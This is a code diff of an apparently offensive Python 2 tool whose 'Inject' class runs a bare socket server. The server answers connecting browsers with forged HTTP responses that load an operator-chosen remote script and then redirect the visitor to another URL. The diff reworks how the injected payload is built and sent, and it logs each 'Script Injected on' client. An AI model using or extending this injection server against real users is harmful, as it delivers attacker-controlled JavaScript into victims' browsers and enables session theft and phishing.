@@ -20,21 +20,6 @@ class Inject(object):
                 else:
                         try: self.js = raw_input("[+] Enter the script source: ")
                         except KeyboardInterrupt: pass
- 
-		self.pre = """ HTTP/1.1 200 OK
-Date: Thu, 12 Apr 2016 15:25 GMT
-Server: Apache/2.2.17 (Unix) mod ssl/2.2 17 OpenSSL/0.9.8l DAV/2
-Last-Modified: Sat, 28 Aug 2015 22:17:02 GMT
-ETag: "20e2b8b-3c-48ee99731f380"
-Accept-Ranges: bytes
-Content-Lenght: 49
-Connection: close
-Content-Type: text/html
-
-
-<head>
-<script src= {}></script>
-</head>""".format(self.js)
 
 		self.response = """ HTTP/1.1 200 OK
 Date: Thu, 12 Apr 2016 15:25 GMT
@@ -49,10 +34,7 @@ Content-Type: text/html
 
 <head>
 <script src= {}></script>
-</head>
-<body>
-<meta http-equiv="refresh" content="0; URL='http://{}"/>
-</body>""".format(self.js,self.url)
+</head>""".format(self.js)
 		self.host = host
 		self.port = port
 
@@ -77,17 +59,19 @@ Content-Type: text/html
 		server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 		server_address = (self.host, self.port)
-		print 'our URL is http://{}:{}'.format(self.host,self.port)
+		print '[+] Injection URL - http://{}:{}'.format(self.host,self.port)
 		server.bind(server_address)
 		server.listen(1)
 		for i in range(0,6):
 			try:
 				if i >= 5:
+					self.response += """<body>
+					<meta http-equiv="refresh" content="0; URL='http://{}"/>
+					</body>""".format(self.url)
 					print "[+] Script Injected on: ", client_address
-					connection.send("%s" % self.response)
 
 				connection,client_address = server.accept()
-				connection.send("%s" % self.pre)
+				connection.send("%s" % self.response)
 				connection.shutdown(socket.SHUT_WR | socket.SHUT_RD)
 				connection.close()
 			except KeyboardInterrupt:
